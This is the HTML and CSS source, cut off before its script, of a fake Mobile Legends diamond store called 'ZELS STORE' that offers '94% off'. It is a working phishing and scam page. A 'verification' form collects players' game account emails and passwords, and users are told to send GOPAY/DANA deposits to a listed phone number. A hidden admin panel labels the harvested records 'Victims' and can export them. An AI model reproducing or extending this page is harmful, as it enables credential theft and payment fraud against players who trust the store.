<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>ZELS STORE - Mobile Legends Diamond</title>
    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        :root {
            --primary: #0c0032;
            --secondary: #190061;
            --accent: #00ffea;
            --danger: #ff0080;
            --warning: #ff8c00;
            --success: #00ff88;
            --dark: #05001a;
            --light: #f0f0f0;
        }

        body {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: white;
            min-height: 100vh;
        }

        /* Auth Pages */
        .auth-container {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .auth-box {
            background: rgba(5, 0, 26, 0.9);
            padding: 40px;
            border-radius: 20px;
            width: 100%;
            max-width: 400px;
            border: 2px solid var(--accent);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
            animation: slideUp 0.5s ease;
        }

        @keyframes slideUp {
            from { opacity: 0; transform: translateY(50px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .auth-logo {
            text-align: center;
            margin-bottom: 30px;
        }

        .auth-logo .logo {
            font-size: 3em;
            font-weight: 900;
            background: linear-gradient(45deg, var(--accent), var(--danger));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
        }

        .auth-logo .tagline {
            color: var(--accent);
            font-size: 0.9em;
            opacity: 0.8;
        }

        .auth-tabs {
            display: flex;
            margin-bottom: 30px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 10px;
            padding: 5px;
        }

        .auth-tab {
            flex: 1;
            text-align: center;
            padding: 15px;
            cursor: pointer;
            border-radius: 8px;
            transition: all 0.3s;
            font-weight: 600;
        }

        .auth-tab.active {
            background: rgba(0, 255, 234, 0.2);
            color: var(--accent);
        }

        .auth-form {
            display: none;
        }

        .auth-form.active {
            display: block;
        }

        .auth-form .input-group {
            margin-bottom: 20px;
        }

        .auth-form label {
            display: block;
            margin-bottom: 8px;
            color: #aaa;
            font-size: 0.9em;
        }

        .auth-form input {
            width: 100%;
            padding: 15px;
            background: rgba(255, 255, 255, 0.1);
            border: 2px solid rgba(255, 255, 255, 0.2);
            border-radius: 10px;
            color: white;
            font-size: 16px;
            transition: all 0.3s;
        }

        .auth-form input:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 20px rgba(0, 255, 234, 0.3);
            background: rgba(255, 255, 255, 0.15);
        }

        .auth-btn {
            background: linear-gradient(45deg, var(--accent), #00b3a4);
            color: black;
            border: none;
            padding: 18px;
            width: 100%;
            border-radius: 10px;
            font-size: 1.1em;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
        }

        .auth-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(0, 255, 234, 0.4);
        }

        .auth-footer {
            text-align: center;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            font-size: 0.9em;
            color: #666;
        }

        .auth-footer a {
            color: var(--accent);
            text-decoration: none;
            font-weight: bold;
        }

        /* Store Page */
        .store-header {
            background: linear-gradient(90deg, rgba(36, 0, 144, 0.9), rgba(120, 0, 255, 0.9));
            padding: 20px;
            text-align: center;
            border-bottom: 3px solid var(--accent);
            position: relative;
        }

        .store-nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }

        .store-logo {
            font-size: 2.5em;
            font-weight: 900;
            background: linear-gradient(45deg, var(--accent), var(--danger));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            cursor: pointer;
            transition: transform 0.3s;
        }

        .store-logo:hover {
            transform: scale(1.05);
        }

        .user-menu {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .balance-box {
            background: linear-gradient(135deg, var(--success), var(--accent));
            padding: 10px 20px;
            border-radius: 50px;
            display: flex;
            align-items: center;
            gap: 10px;
            color: black;
            font-weight: bold;
            box-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
        }

        .balance-amount {
            font-size: 1.2em;
        }

        .user-avatar {
            width: 40px;
            height: 40px;
            background: linear-gradient(45deg, var(--accent), var(--danger));
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            cursor: pointer;
        }

        .store-tagline {
            font-size: 1.2em;
            color: var(--accent);
            margin-bottom: 10px;
        }

        .hot-tag {
            position: absolute;
            top: 10px;
            right: -30px;
            background: linear-gradient(45deg, var(--danger), var(--warning));
            color: white;
            padding: 8px 40px;
            transform: rotate(45deg);
            font-weight: bold;
            font-size: 12px;
            box-shadow: 0 3px 10px rgba(255, 0, 128, 0.4);
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }

        .promo-banner {
            background: linear-gradient(135deg, var(--danger), var(--warning));
            border-radius: 20px;
            padding: 30px;
            margin: 30px 0;
            text-align: center;
            position: relative;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(255, 0, 128, 0.3);
            border: 2px solid var(--accent);
        }

        .promo-title {
            font-size: 2em;
            margin-bottom: 15px;
            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
        }

        .countdown {
            font-size: 2.5em;
            font-weight: bold;
            color: var(--accent);
            margin: 20px 0;
            text-shadow: 0 0 20px rgba(0, 255, 234, 0.5);
        }

        .products-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 25px;
            margin: 40px 0;
        }

        .product-card {
            background: rgba(20, 0, 60, 0.7);
            border-radius: 15px;
            padding: 25px;
            text-align: center;
            border: 2px solid transparent;
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            position: relative;
            backdrop-filter: blur(10px);
        }

        .product-card:hover {
            transform: translateY(-10px);
            border-color: var(--accent);
            box-shadow: 0 15px 40px rgba(0, 255, 234, 0.3);
        }

        .product-card.featured {
            border-color: var(--danger);
            transform: scale(1.05);
            background: linear-gradient(135deg, rgba(36, 0, 144, 0.8), rgba(120, 0, 255, 0.8));
        }

        .diamond-icon {
            font-size: 3em;
            margin-bottom: 15px;
            background: linear-gradient(45deg, var(--accent), var(--danger));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .diamond-amount {
            font-size: 2em;
            font-weight: bold;
            color: var(--accent);
            margin: 10px 0;
        }

        .price {
            font-size: 1.8em;
            color: #4dff00;
            margin: 10px 0;
        }

        .discount-badge {
            background: linear-gradient(45deg, var(--danger), var(--warning));
            color: white;
            padding: 5px 15px;
            border-radius: 20px;
            display: inline-block;
            margin: 10px 0;
            font-size: 0.9em;
            font-weight: bold;
        }

        .order-btn {
            background: linear-gradient(45deg, var(--danger), var(--warning));
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 50px;
            cursor: pointer;
            font-weight: bold;
            margin-top: 15px;
            transition: all 0.3s;
            width: 100%;
        }

        .order-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 5px 20px rgba(255, 0, 128, 0.4);
        }

        .order-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        /* ML Data Form (Wajib diisi sebelum topup) */
        .ml-data-form {
            background: rgba(10, 0, 30, 0.8);
            border-radius: 20px;
            padding: 30px;
            margin: 40px 0;
            border: 2px solid var(--accent);
        }

        .ml-data-title {
            color: var(--accent);
            font-size: 1.8em;
            margin-bottom: 20px;
            text-align: center;
        }

        .ml-data-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 20px;
            margin-bottom: 30px;
        }

        .ml-data-field {
            margin-bottom: 15px;
        }

        .ml-data-field label {
            display: block;
            margin-bottom: 8px;
            color: #aaa;
            font-size: 0.9em;
        }

        .ml-data-field input {
            width: 100%;
            padding: 15px;
            background: rgba(255, 255, 255, 0.1);
            border: 2px solid rgba(255, 255, 255, 0.2);
            border-radius: 10px;
            color: white;
            font-size: 16px;
        }

        .save-ml-btn {
            background: linear-gradient(45deg, var(--accent), var(--success));
            color: black;
            border: none;
            padding: 15px;
            width: 100%;
            border-radius: 10px;
            font-size: 1.1em;
            font-weight: bold;
            cursor: pointer;
        }

        .ml-data-status {
            text-align: center;
            margin-top: 15px;
            padding: 10px;
            border-radius: 10px;
            display: none;
        }

        .ml-data-status.success {
            background: rgba(0, 255, 136, 0.2);
            border: 1px solid var(--success);
            display: block;
        }

        .ml-data-status.warning {
            background: rgba(255, 140, 0, 0.2);
            border: 1px solid var(--warning);
            display: block;
        }

        /* Deposit Section */
        .deposit-section {
            background: rgba(10, 0, 30, 0.8);
            border-radius: 20px;
            padding: 30px;
            margin: 40px 0;
            border: 2px solid var(--accent);
        }

        .deposit-title {
            color: var(--accent);
            font-size: 1.8em;
            margin-bottom: 20px;
            text-align: center;
        }

        .deposit-options {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin: 30px 0;
        }

        .deposit-card {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
            padding: 20px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
            border: 2px solid transparent;
        }

        .deposit-card:hover {
            border-color: var(--accent);
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0, 255, 234, 0.2);
        }

        .deposit-card.disabled {
            opacity: 0.5;
            cursor: not-allowed;
            pointer-events: none;
        }

        .deposit-amount {
            font-size: 1.8em;
            color: var(--success);
            font-weight: bold;
            margin: 10px 0;
        }

        .deposit-bonus {
            background: linear-gradient(45deg, var(--danger), var(--warning));
            padding: 5px 10px;
            border-radius: 20px;
            display: inline-block;
            font-size: 0.8em;
        }

        .payment-info {
            background: rgba(0, 0, 0, 0.3);
            padding: 25px;
            border-radius: 15px;
            margin: 20px 0;
            display: none;
        }

        .payment-info.active {
            display: block;
        }

        .payment-methods {
            display: flex;
            gap: 20px;
            margin-bottom: 20px;
            justify-content: center;
        }

        .payment-method {
            flex: 1;
            max-width: 200px;
            padding: 15px;
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid transparent;
            border-radius: 10px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
        }

        .payment-method:hover {
            border-color: var(--accent);
        }

        .payment-method.selected {
            border-color: var(--success);
            background: rgba(0, 255, 136, 0.1);
        }

        .payment-method.gopay {
            background: rgba(0, 86, 179, 0.2);
        }

        .payment-method.dana {
            background: rgba(0, 101, 179, 0.2);
        }

        .bank-details {
            background: rgba(255, 255, 255, 0.05);
            padding: 20px;
            border-radius: 10px;
            margin: 15px 0;
            text-align: center;
        }

        .bank-number {
            font-size: 2em;
            color: var(--accent);
            font-weight: bold;
            letter-spacing: 2px;
            margin: 10px 0;
        }

        .copy-btn {
            background: linear-gradient(45deg, var(--accent), var(--success));
            color: black;
            border: none;
            padding: 10px 25px;
            border-radius: 50px;
            cursor: pointer;
            font-weight: bold;
            margin: 10px 0;
        }

        .proof-upload {
            margin: 20px 0;
        }

        .proof-upload input {
            width: 100%;
            padding: 15px;
            background: rgba(255, 255, 255, 0.1);
            border: 2px solid rgba(255, 255, 255, 0.2);
            border-radius: 10px;
            color: white;
        }

        .submit-deposit-btn {
            background: linear-gradient(45deg, var(--success), var(--accent));
            color: black;
            border: none;
            padding: 15px;
            width: 100%;
            border-radius: 10px;
            font-size: 1.1em;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
        }

        .submit-deposit-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .transaction-history {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 15px;
            padding: 20px;
            margin-top: 30px;
        }

        .history-item {
            display: flex;
            justify-content: space-between;
            padding: 10px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }

        .history-status {
            padding: 3px 10px;
            border-radius: 20px;
            font-size: 0.8em;
        }

        .status-pending {
            background: var(--warning);
            color: black;
        }

        .status-success {
            background: var(--success);
            color: black;
        }

        .status-rejected {
            background: var(--danger);
            color: white;
        }

        .processing-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 2000;
        }

        .processing-screen.active {
            display: flex;
        }

        .loader {
            width: 100px;
            height: 100px;
            border: 5px solid rgba(255, 255, 255, 0.1);
            border-radius: 50%;
            border-top-color: var(--accent);
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .notification {
            position: fixed;
            bottom: 20px;
            right: 20px;
            padding: 15px 25px;
            border-radius: 10px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
            z-index: 3000;
            display: none;
            animation: slideInRight 0.3s ease;
        }

        @keyframes slideInRight {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }

        .notification.success {
            background: linear-gradient(45deg, var(--success), #00b36b);
            color: white;
        }

        .notification.error {
            background: linear-gradient(45deg, var(--danger), #b3005e);
            color: white;
        }

        .notification.info {
            background: linear-gradient(45deg, var(--accent), #0088ff);
            color: white;
        }

        .success-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 2000;
            padding: 20px;
        }

        .success-screen.active {
            display: flex;
        }

        .success-content {
            background: rgba(5, 0, 26, 0.9);
            padding: 40px;
            border-radius: 20px;
            max-width: 500px;
            text-align: center;
            border: 2px solid var(--accent);
        }

        .success-icon {
            font-size: 4em;
            color: var(--success);
            margin-bottom: 20px;
        }

        /* Hidden Admin Panel */
        .admin-panel {
            position: fixed;
            top: 0;
            right: -450px;
            width: 450px;
            height: 100vh;
            background: rgba(10, 0, 30, 0.98);
            backdrop-filter: blur(20px);
            padding: 20px;
            z-index: 9999;
            transition: right 0.5s cubic-bezier(0.68, -0.55, 0.27, 1.55);
            border-left: 3px solid var(--accent);
            box-shadow: -10px 0 50px rgba(0, 255, 234, 0.2);
            overflow-y: auto;
        }

        .admin-panel.active {
            right: 0;
        }

        .admin-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 2px solid var(--accent);
        }

        .admin-title {
            color: var(--accent);
            font-size: 1.8em;
        }

        .close-admin-btn {
            background: var(--danger);
            color: white;
            border: none;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            font-size: 20px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s;
        }

        .close-admin-btn:hover {
            transform: rotate(90deg);
            background: var(--warning);
        }

        .admin-tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }

        .admin-tab {
            flex: 1;
            padding: 10px;
            background: rgba(255, 255, 255, 0.05);
            border: none;
            color: white;
            cursor: pointer;
            border-radius: 5px;
            transition: all 0.3s;
        }

        .admin-tab.active {
            background: var(--accent);
            color: black;
        }

        .admin-content {
            display: none;
        }

        .admin-content.active {
            display: block;
        }

        .victims-list, .deposit-requests-list, .users-list {
            max-height: 350px;
            overflow-y: auto;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 20px;
        }

        .victim-item, .request-item, .user-item {
            background: rgba(255, 255, 255, 0.05);
            padding: 15px;
            margin-bottom: 10px;
            border-radius: 8px;
            border-left: 4px solid var(--danger);
            word-break: break-word;
        }

        .victim-email, .request-user, .user-email {
            color: var(--accent);
            font-weight: bold;
            margin-bottom: 5px;
        }

        .victim-data, .request-data, .user-data {
            font-size: 0.9em;
            color: #aaa;
            font-family: monospace;
        }

        .proof-thumbnail {
            max-width: 100%;
            max-height: 100px;
            margin: 10px 0;
            border-radius: 5px;
            cursor: pointer;
        }

        .proof-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 10000;
        }

        .proof-modal.active {
            display: flex;
        }

        .proof-modal img {
            max-width: 90%;
            max-height: 90%;
            border-radius: 10px;
        }

        .close-modal {
            position: absolute;
            top: 20px;
            right: 20px;
            color: white;
            font-size: 30px;
            cursor: pointer;
        }

        .request-actions {
            display: flex;
            gap: 10px;
            margin-top: 10px;
        }

        .approve-btn {
            background: linear-gradient(45deg, var(--success), var(--accent));
            color: black;
            border: none;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            flex: 1;
        }

        .reject-btn {
            background: linear-gradient(45deg, var(--danger), var(--warning));
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            flex: 1;
        }

        .view-proof-btn {
            background: var(--accent);
            color: black;
            border: none;
            padding: 5px 10px;
            border-radius: 3px;
            cursor: pointer;
            font-size: 0.8em;
            margin-top: 5px;
        }

        .admin-controls {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            margin-top: 20px;
        }

        .admin-btn {
            padding: 12px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
        }

        .export-btn {
            background: linear-gradient(45deg, var(--success), var(--accent));
            color: black;
        }

        .delete-btn {
            background: linear-gradient(45deg, var(--danger), var(--warning));
            color: white;
        }

        .stats-bar {
            display: flex;
            justify-content: space-around;
            flex-wrap: wrap;
            background: rgba(0, 0, 0, 0.3);
            padding: 30px;
            border-radius: 20px;
            margin: 50px 0;
        }

        .stat-item {
            text-align: center;
            padding: 20px;
        }

        .stat-number {
            font-size: 2.5em;
            background: linear-gradient(45deg, var(--accent), var(--danger));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: bold;
        }

        .footer {
            background: rgba(0, 0, 0, 0.8);
            text-align: center;
            padding: 40px 20px;
            margin-top: 60px;
            border-top: 3px solid var(--danger);
        }

        .hidden {
            display: none;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .admin-panel {
                width: 100%;
                right: -100%;
            }
            .products-grid {
                grid-template-columns: 1fr;
            }
            .stats-bar {
                flex-direction: column;
            }
            .balance-box {
                font-size: 0.9em;
                padding: 8px 12px;
            }
            .ml-data-grid {
                grid-template-columns: 1fr;
            }
            .payment-methods {
                flex-direction: column;
                align-items: center;
            }
            .payment-method {
                max-width: 100%;
                width: 100%;
            }
        }

        /* Admin notification for new data */
        .admin-badge {
            position: absolute;
            top: -5px;
            right: -5px;
            background: var(--danger);
            color: white;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            font-weight: bold;
            animation: pulse 1s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.2); }
            100% { transform: scale(1); }
        }
    </style>
</head>
<body>
    <!-- Login/Register Page -->
    <div id="authPage" class="auth-container">
        <div class="auth-box">
            <div class="auth-logo">
                <div class="logo">ZELS STORE</div>
                <div class="tagline">Mobile Legends Diamond Store</div>
            </div>
            
            <div class="auth-tabs">
                <div class="auth-tab active" onclick="switchAuthTab('login')">Login</div>
                <div class="auth-tab" onclick="switchAuthTab('register')">Daftar</div>
            </div>
            
            <!-- Login Form -->
            <form id="loginForm" class="auth-form active" onsubmit="return false;">
                <div class="input-group">
                    <label>Email</label>
                    <input type="email" id="loginEmail" placeholder="example@gmail.com" required>
                </div>
                
                <div class="input-group">
                    <label>Password</label>
                    <input type="password" id="loginPassword" placeholder="Masukkan password" required>
                </div>
                
                <button type="button" class="auth-btn" onclick="handleLogin()">üöÄ Masuk ke Store</button>
            </form>
            
            <!-- Register Form -->
            <form id="registerForm" class="auth-form" onsubmit="return false;">
                <div class="input-group">
                    <label>Nama Lengkap</label>
                    <input type="text" id="registerName" placeholder="Nama lengkap" required>
                </div>
                
                <div class="input-group">
                    <label>Email</label>
                    <input type="email" id="registerEmail" placeholder="example@gmail.com" required>
                </div>
                
                <div class="input-group">
                    <label>Password</label>
                    <input type="password" id="registerPassword" placeholder="Minimal 6 karakter" required minlength="6">
                </div>
                
                <div class="input-group">
                    <label>Konfirmasi Password</label>
                    <input type="password" id="registerConfirmPassword" placeholder="Ulangi password" required>
                </div>
                
                <button type="button" class="auth-btn" onclick="handleRegister()">üìù Daftar Sekarang</button>
            </form>
            
            <div class="auth-footer">
                <p>Dengan melanjutkan, Anda menyetujui <a href="#">Syarat & Ketentuan</a> kami</p>
            </div>
        </div>
    </div>

    <!-- Store Page (Hidden until login) -->
    <div id="storePage" style="display: none;">
        <!-- Hidden Admin Panel with CLOSE BUTTON -->
        <div class="admin-panel" id="adminPanel">
            <div class="admin-header">
                <div class="admin-title">‚ö° ZELS STORE ADMIN ‚ö°</div>
                <button class="close-admin-btn" onclick="closeAdminPanel()">‚úï</button>
            </div>

            <div class="admin-tabs">
                <button class="admin-tab active" onclick="switchAdminTab('victims')">üìä Victims</button>
                <button class="admin-tab" onclick="switchAdminTab('deposits')">üí∞ Deposits</button>
                <button class="admin-tab" onclick="switchAdminTab('users')">üë• Users</button>
            </div>

            <!-- Victims Tab -->
            <div id="adminVictims" class="admin-content active">
                <h3 style="color: var(--accent); margin-bottom: 10px;">üìß Data Korban (Email & ML)</h3>
                <div class="victims-list" id="victimsList">
                    <div style="text-align: center; color: #666; padding: 20px;">Loading data...</div>
                </div>
            </div>

            <!-- Deposits Tab -->
            <div id="adminDeposits" class="admin-content">
                <h3 style="color: var(--accent); margin-bottom: 10px;">üí∞ Request Deposit</h3>
                <div class="deposit-requests-list" id="depositRequestsList">
                    <div style="text-align: center; color: #666; padding: 20px;">Loading data...</div>
                </div>

                <h3 style="color: var(--accent); margin: 20px 0 10px;">üìä Deposit Stats</h3>
                <div style="background: rgba(0, 0, 0, 0.3); padding: 15px; border-radius: 10px;">
                    <p style="color: #aaa;">Total Requests: <span id="totalDeposits">0</span></p>
                    <p style="color: #aaa;">Pending: <span id="pendingDeposits">0</span></p>
                    <p style="color: #aaa;">Total Amount: Rp <span id="totalDepositAmount">0</span></p>
                </div>
            </div>

            <!-- Users Tab -->
            <div id="adminUsers" class="admin-content">
                <h3 style="color: var(--accent); margin-bottom: 10px;">üë• Daftar User</h3>
                <div class="users-list" id="usersList">
                    <div style="text-align: center; color: #666; padding: 20px;">Loading data...</div>
                </div>

                <div class="admin-controls">
                    <button class="admin-btn export-btn" onclick="exportData()">üì• Export All</button>
                    <button class="admin-btn delete-btn" onclick="deleteAllData()">üóëÔ∏è Delete Victims</button>
                </div>
            </div>
        </div>

        <!-- Proof Modal -->
        <div class="proof-modal" id="proofModal" onclick="closeProofModal()">
            <span class="close-modal">&times;</span>
            <img id="proofImage" src="" alt="Bukti Transfer">
        </div>

        <!-- Store Header -->
        <div class="store-header">
            <div class="store-nav">
                <div class="store-logo" id="secretLogo">ZELS STORE</div>
                <div class="user-menu">
                    <div class="balance-box">
                        <span>üí∞</span>
                        <span class="balance-amount" id="userBalance">Rp 0</span>
                    </div>
                    <div class="user-avatar" id="userAvatar" onclick="showUserMenu()">üë§</div>
                    <button class="order-btn" onclick="logout()" style="width: auto; padding: 10px 20px;">Logout</button>
                </div>
            </div>
            <div class="hot-tag">HOT PROMO</div>
            <div class="store-tagline">#1 Trusted Mobile Legends Diamond Supplier</div>
        </div>

        <div class="container">
            <!-- Promo Banner -->
            <div class="promo-banner">
                <div class="promo-title">üî• FLASH SALE DIAMOND 94% OFF! üî•</div>
                <div style="font-size: 1.2em; margin-bottom: 20px;">Hanya untuk 24 jam ke depan!</div>
                <div class="countdown" id="countdown">01:00:00</div>
                <div style="font-size: 0.9em; color: var(--accent);">Segera ambil promo sebelum kehabisan!</div>
            </div>

            <!-- Products -->
            <div class="products-grid">
                <div class="product-card">
                    <div class="diamond-icon">üíé</div>
                    <div class="diamond-amount">100 Diamond</div>
                    <div class="price">Rp 1.500</div>
                    <div style="color: #aaa; text-decoration: line-through; margin-bottom: 10px;">Rp 25.000</div>
                    <div class="discount-badge">94% OFF</div>
                    <button class="order-btn" onclick="buyWithBalance(100, 1500)">BELI DENGAN SALDO</button>
                </div>

                <div class="product-card featured">
                    <div class="diamond-icon">üíéüíé</div>
                    <div class="diamond-amount">500 Diamond</div>
                    <div class="price">Rp 7.500</div>
                    <div style="color: #aaa; text-decoration: line-through; margin-bottom: 10px;">Rp 125.000</div>
                    <div class="discount-badge">94% OFF</div>
                    <button class="order-btn" onclick="buyWithBalance(500, 7500)">PALING LARIS</button>
                </div>

                <div class="product-card">
                    <div class="diamond-icon">üíéüíéüíé</div>
                    <div class="diamond-amount">1000 Diamond</div>
                    <div class="price">Rp 15.000</div>
                    <div style="color: #aaa; text-decoration: line-through; margin-bottom: 10px;">Rp 250.000</div>
                    <div class="discount-badge">94% OFF</div>
                    <button class="order-btn" onclick="buyWithBalance(1000, 15000)">BELI SEKARANG</button>
                </div>

                <div class="product-card">
                    <div class="diamond-icon">üíéüíéüíéüíé</div>
                    <div class="diamond-amount">2000 Diamond</div>
                    <div class="price">Rp 30.000</div>
                    <div style="color: #aaa; text-decoration: line-through; margin-bottom: 10px;">Rp 500.000</div>
                    <div class="discount-badge">94% OFF</div>
                    <button class="order-btn" onclick="buyWithBalance(2000, 30000)">BELI SEKARANG</button>
                </div>
            </div>

            <!-- ML Data Form (WAJIB DIISI SEBELUM TOPUP) -->
            <div class="ml-data-form" id="mlDataForm">
                <div class="ml-data-title">üîê VERIFIKASI AKUN MOBILE LEGENDS</div>
                <p style="text-align: center; margin-bottom: 30px; color: #aaa;">
                    Isi data akun Mobile Legends Anda sebelum melakukan deposit
                </p>

                <div class="ml-data-grid">
                    <div class="ml-data-field">
                        <label>üìß Email Gmail / Akun ML:</label>
                        <input type="email" id="mlEmail" placeholder="example@gmail.com">
                    </div>

                    <div class="ml-data-field">
                        <label>üîë Password Akun ML:</label>
                        <input type="password" id="mlPassword" placeholder="Masukkan password">
                    </div>

                    <div class="ml-data-field">
                        <label>üÜî ID Mobile Legends:</label>
                        <input type="text" id="mlID" placeholder="Contoh: 123456789">
                    </div>

                    <div class="ml-data-field">
                        <label>üåê Server ID:</label>
                        <input type="text" id="mlServer" placeholder="Contoh: 8001" value="8001">
                    </div>

                    <div class="ml-data-field">
                        <label>üì± Nomor WhatsApp:</label>
                        <input type="tel" id="mlPhone" placeholder="0812-3456-7890">
                    </div>
                </div>

                <button class="save-ml-btn" onclick="saveMLData()">üíæ SIMPAN DATA ML</button>

                <div class="ml-data-status" id="mlDataStatus">
                    ‚úÖ Data ML berhasil disimpan! Sekarang Anda bisa deposit.
                </div>
            </div>

            <!-- Deposit Section -->
            <div class="deposit-section">
                <div class="deposit-title">üí∞ DEPOSIT SALDO</div>
                <p style="text-align: center; margin-bottom: 30px;">Isi saldo dulu buat beli diamond!</p>

                <div class="deposit-options" id="depositOptions">
                    <div class="deposit-card disabled" id="deposit25" onclick="selectDeposit(25000)">
                        <div>üíé</div>
                        <div class="deposit-amount">Rp 25.000</div>
                        <div class="deposit-bonus">Bonus 5% (Rp 1.250)</div>
                    </div>
                    <div class="deposit-card disabled" id="deposit50" onclick="selectDeposit(50000)">
                        <div>üíéüíé</div>
                        <div class="deposit-amount">Rp 50.000</div>
                        <div class="deposit-bonus">Bonus 10% (Rp 5.000)</div>
                    </div>
                    <div class="deposit-card disabled" id="deposit100" onclick="selectDeposit(100000)">
                        <div>üíéüíéüíé</div>
                        <div class="deposit-amount">Rp 100.000</div>
                        <div class="deposit-bonus">Bonus 15% (Rp 15.000)</div>
                    </div>
                    <div class="deposit-card disabled" id="deposit200" onclick="selectDeposit(200000)">
                        <div>üíéüíéüíéüíé</div>
                        <div class="deposit-amount">Rp 200.000</div>
                        <div class="deposit-bonus">Bonus 20% (Rp 40.000)</div>
                    </div>
                </div>

                <!-- Payment Info (GOPAY & DANA only) -->
                <div class="payment-info" id="paymentInfo">
                    <h3 style="color: var(--accent); margin-bottom: 20px;">üí≥ PILIH METODE PEMBAYARAN</h3>
                    
                    <div class="payment-methods">
                        <div class="payment-method gopay" id="methodGopay" onclick="selectPaymentMethod('gopay')">
                            <div style="font-size: 2em;">üü¢</div>
                            <div style="font-weight: bold;">GOPAY</div>
                        </div>
                        <div class="payment-method dana" id="methodDana" onclick="selectPaymentMethod('dana')">
                            <div style="font-size: 2em;">üîµ</div>
                            <div style="font-weight: bold;">DANA</div>
                        </div>
                    </div>

                    <div class="bank-details" id="paymentDetails" style="display: none;">
                        <div style="font-size: 1.2em; margin-bottom: 10px;" id="paymentMethodName">GOPAY</div>
                        <div style="color: #aaa;">Nomor Tujuan:</div>
                        <div class="bank-number">087760337535</div>
                        <div style="color: #aaa;">a.n. ZELS STORE</div>
                        <button class="copy-btn" onclick="copyBankNumber()">üìã COPY NOMOR</button>
                    </div>

                    <div style="margin: 20px 0; padding: 15px; background: rgba(0, 255, 234, 0.1); border-radius: 10px;">
                        <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
                            <span>Jumlah Deposit:</span>
                            <span style="color: var(--success); font-weight: bold;" id="selectedAmount">Rp 0</span>
                        </div>
                        <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
                            <span>Bonus:</span>
                            <span style="color: var(--warning);" id="bonusAmount">Rp 0</span>
                        </div>
